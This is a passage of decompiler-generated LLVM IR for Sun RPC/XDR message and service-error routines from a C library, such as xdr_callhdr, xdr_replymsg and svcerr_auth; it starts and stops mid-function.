dec_label_pc_8063ab1:                             ; preds = %dec_label_pc_8063a8c, %dec_label_pc_8063aa5
  %v0_8063ab1 = phi i32 [ %v2_8063a80, %dec_label_pc_8063a8c ], [ %v0_8063ab1.pre, %dec_label_pc_8063aa5 ]
  ret i32 %v0_8063ab1

; uselistorder directives
  uselistorder i32 %v2_8063a80, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8063a80, { 1, 0, 2, 3 }
  uselistorder i32* %v1_8063a62, { 1, 0 }
  uselistorder i32 %v1_80639e3, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp, { 8, 9, 10, 0, 1, 6, 5, 4, 3, 2, 7, 11 }
  uselistorder i32* %ecx.global-to-local, { 0, 3, 4, 1, 2, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13 }
  uselistorder label %dec_label_pc_8063ab1, { 1, 0 }
  uselistorder label %dec_label_pc_8063a80, { 9, 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8063a6f, { 1, 0 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v0_8063ab2 = load i32, i32* @esi, align 4
  %v0_8063ab3 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %tmp1, i32* %esi.global-to-local, align 4
  %v1_8063abf = add i32 %arg2, 4
  %v2_8063abf = inttoptr i32 %v1_8063abf to i32*
  store i32 0, i32* %v2_8063abf, align 4
  %v0_8063ac6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063ac6 = add i32 %v0_8063ac6, 8
  %v2_8063ac6 = inttoptr i32 %v1_8063ac6 to i32*
  store i32 2, i32* %v2_8063ac6, align 4
  %v0_8063acd = load i32, i32* %esi.global-to-local, align 4
  %v1_8063acd = inttoptr i32 %v0_8063acd to i32*
  %v2_8063acd = load i32, i32* %v1_8063acd, align 4
  %v3_8063acd = icmp eq i32 %v2_8063acd, 0
  %v1_8063ad0 = icmp eq i1 %v3_8063acd, false
  br i1 %v1_8063ad0, label %dec_label_pc_8063b2e, label %dec_label_pc_8063ad2

dec_label_pc_8063ad2:                             ; preds = %entry
  %v0_8063ad4 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8063ad6 = call i32 @xdr_u_long(i32* %v1_8063acd, i32 %v0_8063ad4)
  %v1_8063ade = icmp eq i32 %v3_8063ad6, 0
  br i1 %v1_8063ade, label %dec_label_pc_8063b2e, label %dec_label_pc_8063ae2

dec_label_pc_8063ae2:                             ; preds = %dec_label_pc_8063ad2
  %v0_8063ae4 = load i32, i32* @ebx, align 4
  %v1_8063ae4 = add i32 %v0_8063ae4, 4
  %v0_8063ae8 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063ae9 = call i32 @xdr_enum(i32 %v0_8063ae8, i32 %v1_8063ae4)
  %v1_8063af1 = icmp eq i32 %v2_8063ae9, 0
  br i1 %v1_8063af1, label %dec_label_pc_8063b2e, label %dec_label_pc_8063af5

dec_label_pc_8063af5:                             ; preds = %dec_label_pc_8063ae2
  %v0_8063af7 = load i32, i32* @ebx, align 4
  %v1_8063af7 = add i32 %v0_8063af7, 8
  store i32 %v1_8063af7, i32* @eax, align 4
  %v0_8063afb = load i32, i32* %esi.global-to-local, align 4
  %v2_8063afc = inttoptr i32 %v0_8063afb to i32*
  %v3_8063afc = call i32 @xdr_u_long(i32* %v2_8063afc, i32 %v1_8063af7)
  %v1_8063b04 = icmp eq i32 %v3_8063afc, 0
  br i1 %v1_8063b04, label %dec_label_pc_8063b2e, label %dec_label_pc_8063b08

dec_label_pc_8063b08:                             ; preds = %dec_label_pc_8063af5
  %v0_8063b0a = load i32, i32* @ebx, align 4
  %v1_8063b0a = add i32 %v0_8063b0a, 12
  store i32 %v1_8063b0a, i32* @eax, align 4
  %v0_8063b0e = load i32, i32* %esi.global-to-local, align 4
  %v2_8063b0f = inttoptr i32 %v0_8063b0e to i32*
  %v3_8063b0f = call i32 @xdr_u_long(i32* %v2_8063b0f, i32 %v1_8063b0a)
  %v1_8063b17 = icmp eq i32 %v3_8063b0f, 0
  br i1 %v1_8063b17, label %dec_label_pc_8063b2e, label %dec_label_pc_8063b1b

dec_label_pc_8063b1b:                             ; preds = %dec_label_pc_8063b08
  %v0_8063b1b = load i32, i32* @ebx, align 4
  %v1_8063b1b = add i32 %v0_8063b1b, 16
  store i32 %v1_8063b1b, i32* @eax, align 4
  %v0_8063b1e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8063ab3, i32* %ebx.global-to-local, align 4
  store i32 %v0_8063ab2, i32* %esi.global-to-local, align 4
  %v2_8063b29 = inttoptr i32 %v0_8063b1e to i32*
  %v3_8063b29 = call i32 @xdr_u_long(i32* %v2_8063b29, i32 %v1_8063b1b)
  br label %dec_label_pc_8063b2e

dec_label_pc_8063b2e:                             ; preds = %dec_label_pc_8063b08, %dec_label_pc_8063af5, %dec_label_pc_8063ae2, %dec_label_pc_8063ad2, %entry, %dec_label_pc_8063b1b
  store i32 %v0_8063ab3, i32* @ebx, align 4
  store i32 %v0_8063ab2, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8063ab3, { 1, 0 }
  uselistorder i32 %v0_8063ab2, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8063b2e, { 5, 0, 1, 2, 3, 4 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8063b34 = load i32, i32* @esi, align 4
  %v0_8063b35 = load i32, i32* @ebx, align 4
  store i32 %v0_8063b35, i32* %stack_var_-8, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v2_8063b43 = call i32 @xdr_enum(i32 %arg1, i32 %tmp4)
  %v1_8063b4b = icmp eq i32 %v2_8063b43, 0
  br i1 %v1_8063b4b, label %dec_label_pc_8063b93, label %dec_label_pc_8063b4f

dec_label_pc_8063b4f:                             ; preds = %entry
  %v0_8063b4f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063b4f = inttoptr i32 %v0_8063b4f to i32*
  %v2_8063b4f = load i32, i32* %v1_8063b4f, align 4
  %v1_8063b51 = icmp eq i32 %v2_8063b4f, 0
  br i1 %v1_8063b51, label %dec_label_pc_8063b5a, label %dec_label_pc_8063b55

dec_label_pc_8063b55:                             ; preds = %dec_label_pc_8063b4f
  %v8_8063b55 = icmp eq i32 %v2_8063b4f, 1
  %v1_8063b56 = icmp eq i1 %v8_8063b55, false
  br i1 %v1_8063b56, label %dec_label_pc_8063b93, label %dec_label_pc_8063b55.dec_label_pc_8063b80_crit_edge

dec_label_pc_8063b55.dec_label_pc_8063b80_crit_edge: ; preds = %dec_label_pc_8063b55
  br label %dec_label_pc_8063b80

dec_label_pc_8063b5a:                             ; preds = %dec_label_pc_8063b4f
  %v1_8063b5c = add i32 %v0_8063b4f, 4
  store i32 %v1_8063b5c, i32* @eax, align 4
  %v0_8063b60 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063b61 = inttoptr i32 %v0_8063b60 to i32*
  %v3_8063b61 = call i32 @xdr_u_long(i32* %v2_8063b61, i32 %v1_8063b5c)
  %v1_8063b69 = icmp eq i32 %v3_8063b61, 0
  br i1 %v1_8063b69, label %dec_label_pc_8063b93, label %dec_label_pc_8063b6d

dec_label_pc_8063b6d:                             ; preds = %dec_label_pc_8063b5a
  %v0_8063b6d = load i32, i32* @ebx, align 4
  %v1_8063b6d = add i32 %v0_8063b6d, 8
  store i32 %v1_8063b6d, i32* @eax, align 4
  %v0_8063b70 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063b79 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063b79, i32* %ebx.global-to-local, align 4
  store i32 %v0_8063b34, i32* %esi.global-to-local, align 4
  %v2_8063b7b = inttoptr i32 %v0_8063b70 to i32*
  %v3_8063b7b = call i32 @xdr_u_long(i32* %v2_8063b7b, i32 %v1_8063b6d)
  %v0_8063b80.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8063b80

dec_label_pc_8063b80:                             ; preds = %dec_label_pc_8063b55.dec_label_pc_8063b80_crit_edge, %dec_label_pc_8063b6d
  %v0_8063b80 = phi i32 [ %v0_8063b4f, %dec_label_pc_8063b55.dec_label_pc_8063b80_crit_edge ], [ %v0_8063b80.pre, %dec_label_pc_8063b6d ]
  %v1_8063b80 = add i32 %v0_8063b80, 4
  %v0_8063b83 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063b8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063b8c, i32* %ebx.global-to-local, align 4
  store i32 %v0_8063b34, i32* %esi.global-to-local, align 4
  %v2_8063b8e = call i32 @xdr_enum(i32 %v0_8063b83, i32 %v1_8063b80)
  br label %dec_label_pc_8063b93

dec_label_pc_8063b93:                             ; preds = %dec_label_pc_8063b5a, %dec_label_pc_8063b55, %entry, %dec_label_pc_8063b80
  %v2_8063b96 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063b96, i32* %ebx.global-to-local, align 4
  store i32 %v0_8063b34, i32* %esi.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8063b34, { 2, 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8063b93, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8063b80, { 1, 0 }
}

define i32 @__GI_xdr_replymsg() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_8063b99 = load i32, i32* @esi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v2_8063ba8 = inttoptr i32 %tmp to i32*
  %v3_8063ba8 = call i32 @xdr_u_long(i32* %v2_8063ba8, i32 %tmp2)
  %v1_8063bb0 = icmp eq i32 %v3_8063ba8, 0
  br i1 %v1_8063bb0, label %dec_label_pc_8063bea, label %dec_label_pc_8063bb4

dec_label_pc_8063bb4:                             ; preds = %entry
  %v0_8063bb6 = load i32, i32* @ebx, align 4
  %v1_8063bb6 = add i32 %v0_8063bb6, 4
  %v0_8063bba = load i32, i32* @esi, align 4
  %v2_8063bbb = call i32 @xdr_enum(i32 %v0_8063bba, i32 %v1_8063bb6)
  %v1_8063bc3 = icmp eq i32 %v2_8063bbb, 0
  br i1 %v1_8063bc3, label %dec_label_pc_8063bea, label %dec_label_pc_8063bc7

dec_label_pc_8063bc7:                             ; preds = %dec_label_pc_8063bb4
  %v0_8063bc7 = load i32, i32* @ebx, align 4
  %v1_8063bc7 = add i32 %v0_8063bc7, 4
  %v2_8063bc7 = inttoptr i32 %v1_8063bc7 to i32*
  %v3_8063bc7 = load i32, i32* %v2_8063bc7, align 4
  %v12_8063bc7 = icmp eq i32 %v3_8063bc7, 1
  %v1_8063bcb = icmp eq i1 %v12_8063bc7, false
  br i1 %v1_8063bcb, label %dec_label_pc_8063bea, label %dec_label_pc_8063bcd

dec_label_pc_8063bcd:                             ; preds = %dec_label_pc_8063bc7
  %v1_8063bd7 = add i32 %v0_8063bc7, 12
  %v1_8063bdb = add i32 %v0_8063bc7, 8
  %v0_8063bdf = load i32, i32* @esi, align 4
  %v5_8063be0 = inttoptr i32 %v1_8063bdb to i32*
  %v6_8063be0 = call i32 @xdr_union(i32 %v0_8063bdf, i32* %v5_8063be0, i32 %v1_8063bd7, i32 ptrtoint (i32* @global_var_806efc0.753 to i32), i32 0)
  br label %dec_label_pc_8063bec

dec_label_pc_8063bea:                             ; preds = %dec_label_pc_8063bc7, %dec_label_pc_8063bb4, %entry
  br label %dec_label_pc_8063bec

dec_label_pc_8063bec:                             ; preds = %dec_label_pc_8063bcd, %dec_label_pc_8063bea
  %v0_8063bef = phi i32 [ %v6_8063be0, %dec_label_pc_8063bcd ], [ 0, %dec_label_pc_8063bea ]
  store i32 %v0_8063b99, i32* @esi, align 4
  ret i32 %v0_8063bef

; uselistorder directives
  uselistorder i32 %v0_8063bc7, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8063bec, { 1, 0 }
}

define i32 @xdr_des_block(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8063bfd = call i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 8)
  ret i32 %v3_8063bfd
}

define i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8063c06 = load i32, i32* @esi, align 4
  %v0_8063c07 = load i32, i32* @ebx, align 4
  store i32 %v0_8063c07, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8063c15 = call i32 @xdr_enum(i32 %arg1, i32 %arg2)
  %v1_8063c1f = icmp eq i32 %v2_8063c15, 0
  br i1 %v1_8063c1f, label %dec_label_pc_8063c3b, label %dec_label_pc_8063c23

dec_label_pc_8063c23:                             ; preds = %entry
  %v0_8063c28 = load i32, i32* @ebx, align 4
  %v1_8063c28 = add i32 %v0_8063c28, 8
  %v1_8063c2c = add i32 %v0_8063c28, 4
  %v0_8063c30 = load i32, i32* @esi, align 4
  %v4_8063c31 = inttoptr i32 %v0_8063c30 to i32*
  %v5_8063c31 = call i32 @xdr_bytes(i32* %v4_8063c31, i32 %v1_8063c2c, i32 %v1_8063c28, i32 400)
  br label %dec_label_pc_8063c3b

dec_label_pc_8063c3b:                             ; preds = %entry, %dec_label_pc_8063c23
  %v0_8063c3c = phi i32 [ 0, %entry ], [ %v5_8063c31, %dec_label_pc_8063c23 ]
  %v2_8063c3e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063c3e, i32* @ebx, align 4
  store i32 %v0_8063c06, i32* @esi, align 4
  ret i32 %v0_8063c3c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8063c3b, { 1, 0 }
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8063c41 = load i32, i32* @esi, align 4
  %v0_8063c42 = load i32, i32* @ebx, align 4
  store i32 %v0_8063c42, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8063c50 = call i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2)
  %v1_8063c58 = icmp eq i32 %v2_8063c50, 0
  br i1 %v1_8063c58, label %dec_label_pc_8063cbb, label %dec_label_pc_8063c5c

dec_label_pc_8063c5c:                             ; preds = %entry
  %v0_8063c5e = load i32, i32* @ebx, align 4
  %v1_8063c5e = add i32 %v0_8063c5e, 12
  %v0_8063c62 = load i32, i32* @esi, align 4
  %v2_8063c63 = call i32 @xdr_enum(i32 %v0_8063c62, i32 %v1_8063c5e)
  %v1_8063c6b = icmp eq i32 %v2_8063c63, 0
  br i1 %v1_8063c6b, label %dec_label_pc_8063cbb, label %dec_label_pc_8063c6f

dec_label_pc_8063c6f:                             ; preds = %dec_label_pc_8063c5c
  %v0_8063c6f = load i32, i32* @ebx, align 4
  %v1_8063c6f = add i32 %v0_8063c6f, 12
  %v2_8063c6f = inttoptr i32 %v1_8063c6f to i32*
  %v3_8063c6f = load i32, i32* %v2_8063c6f, align 4
  %v1_8063c72 = icmp eq i32 %v3_8063c6f, 0
  br i1 %v1_8063c72, label %dec_label_pc_8063c82, label %dec_label_pc_8063c76

dec_label_pc_8063c76:                             ; preds = %dec_label_pc_8063c6f
  %v9_8063c76 = icmp eq i32 %v3_8063c6f, 2
  %v1_8063c7e = icmp eq i1 %v9_8063c76, false
  br i1 %v1_8063c7e, label %dec_label_pc_8063cbd, label %dec_label_pc_8063c95

dec_label_pc_8063c82:                             ; preds = %dec_label_pc_8063c6f
  %v1_8063c8d = add i32 %v0_8063c6f, 20
  %v2_8063c8d = inttoptr i32 %v1_8063c8d to i32*
  %v3_8063c8d = load i32, i32* %v2_8063c8d, align 4
  %v2_8063c91 = load i32, i32* %stack_var_-8, align 4
  store i32 %v0_8063c41, i32* @esi, align 4
  call void @__pseudo_branch(i32 %v3_8063c8d)
  br label %dec_label_pc_8063c95

dec_label_pc_8063c95:                             ; preds = %dec_label_pc_8063c76, %dec_label_pc_8063c82
  %v0_8063c97 = phi i32 [ %v0_8063c6f, %dec_label_pc_8063c76 ], [ %v2_8063c91, %dec_label_pc_8063c82 ]
  %v1_8063c97 = add i32 %v0_8063c97, 16
  store i32 %v1_8063c97, i32* @eax, align 4
  %v0_8063c9b = load i32, i32* @esi, align 4
  %v2_8063c9c = inttoptr i32 %v0_8063c9b to i32*
  %v3_8063c9c = call i32 @xdr_u_long(i32* %v2_8063c9c, i32 %v1_8063c97)
  %v1_8063ca4 = icmp eq i32 %v3_8063c9c, 0
  br i1 %v1_8063ca4, label %dec_label_pc_8063cbb, label %dec_label_pc_8063ca8

dec_label_pc_8063ca8:                             ; preds = %dec_label_pc_8063c95
  %v0_8063ca8 = load i32, i32* @ebx, align 4
  %v1_8063ca8 = add i32 %v0_8063ca8, 20
  %v0_8063cab = load i32, i32* @esi, align 4
  %v2_8063cb3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063cb3, i32* @eax, align 4
  %v2_8063cb6 = inttoptr i32 %v0_8063cab to i32*
  %v3_8063cb6 = call i32 @xdr_u_long(i32* %v2_8063cb6, i32 %v1_8063ca8)
  br label %dec_label_pc_8063cbb

dec_label_pc_8063cbb:                             ; preds = %dec_label_pc_8063c95, %dec_label_pc_8063c5c, %entry, %dec_label_pc_8063ca8
  br label %dec_label_pc_8063cbd

dec_label_pc_8063cbd:                             ; preds = %dec_label_pc_8063c76, %dec_label_pc_8063cbb
  %v0_8063cc0 = phi i32 [ 1, %dec_label_pc_8063c76 ], [ 0, %dec_label_pc_8063cbb ]
  ret i32 %v0_8063cc0

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8063cbd, { 1, 0 }
  uselistorder label %dec_label_pc_8063cbb, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8063c95, { 1, 0 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8063ce3 = add i32 %arg1, 32
  %v3_8063ce8 = bitcast i32* %stack_var_-40 to i16*
  %v4_8063ce8 = call i32 @memcpy(i16* %v3_8063ce8, i32 %v1_8063ce3, i32 12)
  %v1_8063d07 = add i32 %arg1, 8
  %v2_8063d07 = inttoptr i32 %v1_8063d07 to i32*
  %v3_8063d07 = load i32, i32* %v2_8063d07, align 4
  %v2_8063d0a = ptrtoint i32* %stack_var_-52 to i32
  %v5_8063d10 = add i32 %v3_8063d07, 12
  %v6_8063d10 = inttoptr i32 %v5_8063d10 to i32*
  %v7_8063d10 = load i32, i32* %v6_8063d10, align 4
  call void @__pseudo_call(i32 %v7_8063d10)
  ret i32 %v2_8063d0a
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8063d37 = add i32 %arg1, 32
  %v3_8063d3c = bitcast i32* %stack_var_-40 to i16*
  %v4_8063d3c = call i32 @memcpy(i16* %v3_8063d3c, i32 %v1_8063d37, i32 12)
  %v1_8063d4b = add i32 %arg1, 8
  %v2_8063d4b = inttoptr i32 %v1_8063d4b to i32*
  %v3_8063d4b = load i32, i32* %v2_8063d4b, align 4
  %v2_8063d4e = ptrtoint i32* %stack_var_-52 to i32
  %v5_8063d54 = add i32 %v3_8063d4b, 12
  %v6_8063d54 = inttoptr i32 %v5_8063d54 to i32*
  %v7_8063d54 = load i32, i32* %v6_8063d54, align 4
  call void @__pseudo_call(i32 %v7_8063d54)
  ret i32 %v2_8063d4e
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8063d7b = add i32 %arg1, 32
  %v3_8063d80 = bitcast i32* %stack_var_-40 to i16*
  %v4_8063d80 = call i32 @memcpy(i16* %v3_8063d80, i32 %v1_8063d7b, i32 12)
  %v1_8063d8f = add i32 %arg1, 8
  %v2_8063d8f = inttoptr i32 %v1_8063d8f to i32*
  %v3_8063d8f = load i32, i32* %v2_8063d8f, align 4
  %v2_8063d92 = ptrtoint i32* %stack_var_-52 to i32
  %v5_8063d98 = add i32 %v3_8063d8f, 12
  %v6_8063d98 = inttoptr i32 %v5_8063d98 to i32*
  %v7_8063d98 = load i32, i32* %v6_8063d98, align 4
  call void @__pseudo_call(i32 %v7_8063d98)
  ret i32 %v2_8063d92
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8063dbf = add i32 %arg1, 32
  %v3_8063dc4 = bitcast i32* %stack_var_-40 to i16*
  %v4_8063dc4 = call i32 @memcpy(i16* %v3_8063dc4, i32 %v1_8063dbf, i32 12)
  %v1_8063dd3 = add i32 %arg1, 8
  %v2_8063dd3 = inttoptr i32 %v1_8063dd3 to i32*
  %v3_8063dd3 = load i32, i32* %v2_8063dd3, align 4
  %v2_8063dd6 = ptrtoint i32* %stack_var_-52 to i32
  %v5_8063ddc = add i32 %v3_8063dd3, 12
  %v6_8063ddc = inttoptr i32 %v5_8063ddc to i32*
  %v7_8063ddc = load i32, i32* %v6_8063ddc, align 4
  call void @__pseudo_call(i32 %v7_8063ddc)
  ret i32 %v2_8063dd6
}

define i32 @svcerr_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v2_8063e03 = ptrtoint i32* %stack_var_-48 to i32
  %v1_8063e0f = add i32 %arg1, 8
  %v2_8063e0f = inttoptr i32 %v1_8063e0f to i32*
  %v3_8063e0f = load i32, i32* %v2_8063e0f, align 4
  store i32 %v3_8063e0f, i32* @edx, align 4
  %v5_8063e14 = add i32 %v3_8063e0f, 12
  %v6_8063e14 = inttoptr i32 %v5_8063e14 to i32*
  %v7_8063e14 = load i32, i32* %v6_8063e14, align 4
  call void @__pseudo_call(i32 %v7_8063e14)
  ret i32 %v2_8063e03

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_weakauth(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8063e24 = call i32 @svcerr_auth(i32 %arg1, i32 5)
  ret i32 %v2_8063e24
}

define i32 @__GI_svcerr_noprog() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8063e4c = add i32 %tmp3, 32
  %v3_8063e51 = bitcast i32* %stack_var_-40 to i16*
  %v4_8063e51 = call i32 @memcpy(i16* %v3_8063e51, i32 %v1_8063e4c, i32 12)
  %v1_8063e60 = add i32 %tmp3, 8
  %v2_8063e60 = inttoptr i32 %v1_8063e60 to i32*
  %v3_8063e60 = load i32, i32* %v2_8063e60, align 4
  store i32 %v3_8063e60, i32* @edx, align 4
  %v2_8063e63 = ptrtoint i32* %stack_var_-52 to i32
  %v5_8063e69 = add i32 %v3_8063e60, 12
  %v6_8063e69 = inttoptr i32 %v5_8063e69 to i32*
  %v7_8063e69 = load i32, i32* %v6_8063e69, align 4
  call void @__pseudo_call(i32 %v7_8063e69)
  ret i32 %v2_8063e63
}

define i32 @svcerr_progvers() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8063e90 = add i32 %tmp7, 32
  %v3_8063e95 = bitcast i32* %stack_var_-40 to i16*
  %v4_8063e95 = call i32 @memcpy(i16* %v3_8063e95, i32 %v1_8063e90, i32 12)
  %v1_8063eb4 = add i32 %tmp7, 8
  %v2_8063eb4 = inttoptr i32 %v1_8063eb4 to i32*
  %v3_8063eb4 = load i32, i32* %v2_8063eb4, align 4
  store i32 %v3_8063eb4, i32* @edx, align 4
  %v2_8063eb7 = ptrtoint i32* %stack_var_-52 to i32
  %v5_8063ebd = add i32 %v3_8063eb4, 12
  %v6_8063ebd = inttoptr i32 %v5_8063ebd to i32*
  %v7_8063ebd = load i32, i32* %v6_8063ebd, align 4
  call void @__pseudo_call(i32 %v7_8063ebd)
  ret i32 %v2_8063eb7
}

define i32 @svc_find(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8063ec5 = load i32, i32* @edi, align 4
  %v0_8063ec6 = load i32, i32* @eax, align 4
  store i32 %v0_8063ec6, i32* @edi, align 4
  %v0_8063ec8 = load i32, i32* @esi, align 4
  %v0_8063ec9 = load i32, i32* @ecx, align 4
  store i32 %v0_8063ec9, i32* @esi, align 4
  %v0_8063ecb = load i32, i32* @ebx, align 4
  store i32 %v0_8063ecb, i32* %stack_var_-12, align 4
  %v0_8063ecc = load i32, i32* @edx, align 4
  store i32 %v0_8063ecc, i32* @ebx, align 4
  %v1_8063ece = call i32 @__rpc_thread_variables(i32 %v0_8063ecb)
  store i32 %v1_8063ece, i32* %eax.global-to-local, align 4
  %v1_8063ed5 = add i32 %v1_8063ece, 184
  %storemerge.in1 = inttoptr i32 %v1_8063ed5 to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_8063eeb3 = icmp eq i32 %storemerge2, 0
  %v1_8063eed10 = icmp eq i1 %v1_8063eeb3, false
  br i1 %v1_8063eed10, label %dec_label_pc_8063edd.lr.ph, label %dec_label_pc_8063eef

dec_label_pc_8063edd.lr.ph:                       ; preds = %entry
  %v4_8063edd.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8063edd

dec_label_pc_8063edd:                             ; preds = %dec_label_pc_8063edd.lr.ph, %dec_label_pc_8063ee7
  %v0_8063ef014 = phi i32 [ 0, %dec_label_pc_8063edd.lr.ph ], [ %v0_8063ee7, %dec_label_pc_8063ee7 ]
  %v0_8063ee7 = phi i32 [ %storemerge2, %dec_label_pc_8063edd.lr.ph ], [ %storemerge, %dec_label_pc_8063ee7 ]
  %v1_8063edd = add i32 %v0_8063ee7, 4
  %v2_8063edd = inttoptr i32 %v1_8063edd to i32*
  %v3_8063edd = load i32, i32* %v2_8063edd, align 4
  %v15_8063edd = icmp eq i32 %v3_8063edd, %v4_8063edd.pre
  %v1_8063ee0 = icmp eq i1 %v15_8063edd, false
  br i1 %v1_8063ee0, label %dec_label_pc_8063ee7, label %dec_label_pc_8063ee2

dec_label_pc_8063ee2:                             ; preds = %dec_label_pc_8063edd
  %v1_8063ee2 = add i32 %v0_8063ee7, 8
  %v2_8063ee2 = inttoptr i32 %v1_8063ee2 to i32*
  %v3_8063ee2 = load i32, i32* %v2_8063ee2, align 4
  %v4_8063ee2 = load i32, i32* @ebx, align 4
  %v15_8063ee2 = icmp eq i32 %v3_8063ee2, %v4_8063ee2
  br i1 %v15_8063ee2, label %dec_label_pc_8063ee2.dec_label_pc_8063eef_crit_edge, label %dec_label_pc_8063ee7

dec_label_pc_8063ee7:                             ; preds = %dec_label_pc_8063ee2, %dec_label_pc_8063edd
  %storemerge.in = inttoptr i32 %v0_8063ee7 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8063eeb = icmp eq i32 %storemerge, 0
  %v1_8063eed = icmp eq i1 %v1_8063eeb, false
  br i1 %v1_8063eed, label %dec_label_pc_8063edd, label %dec_label_pc_8063eeb.dec_label_pc_8063eef_crit_edge

dec_label_pc_8063ee2.dec_label_pc_8063eef_crit_edge: ; preds = %dec_label_pc_8063ee2
  br label %dec_label_pc_8063eef

dec_label_pc_8063eeb.dec_label_pc_8063eef_crit_edge: ; preds = %dec_label_pc_8063ee7
  br label %dec_label_pc_8063eef

dec_label_pc_8063eef:                             ; preds = %dec_label_pc_8063eeb.dec_label_pc_8063eef_crit_edge, %dec_label_pc_8063ee2.dec_label_pc_8063eef_crit_edge, %entry
  %v0_8063ef0 = phi i32 [ %v0_8063ee7, %dec_label_pc_8063eeb.dec_label_pc_8063eef_crit_edge ], [ %v0_8063ef014, %dec_label_pc_8063ee2.dec_label_pc_8063eef_crit_edge ], [ 0, %entry ]
  %v2_8063eef = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063eef, i32* @ebx, align 4
  %v1_8063ef0 = load i32, i32* @esi, align 4
